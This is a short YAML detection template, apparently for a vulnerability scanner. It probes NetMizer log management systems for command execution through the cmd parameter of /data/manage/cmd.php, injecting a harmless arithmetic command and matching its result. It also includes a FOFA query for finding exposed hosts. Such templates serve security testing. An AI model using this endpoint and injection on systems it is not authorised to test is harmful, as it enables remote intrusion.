id: poc-yaml-netmizer-log-manage-cmd-rce
info:
  name: NetMizer 日志管理系统 cmd.php 远程命令执行漏洞
  severity: critical
  tags:
  - rce
  finger: NetMizer 日志管理系统
  fofa: title="NetMizer 日志管理系统"
variables:
  t1: random_int(111000111000,999000999000)
  t2: random_int(10,100)
  t3: t1 - t2
requests:
- method: GET
  path: /data/manage/cmd.php?cmd=set%20/a%20{{.t1}}%20-%20{{.t2}}%26expr%20{{.t1}}%20-%20{{.t2}}
  expression: 'status_code == 200 &&

    contains(body,"<pre>") &&

    !contains(body,"<html>") &&

    matches(body, str(t3))

    '
transport: http
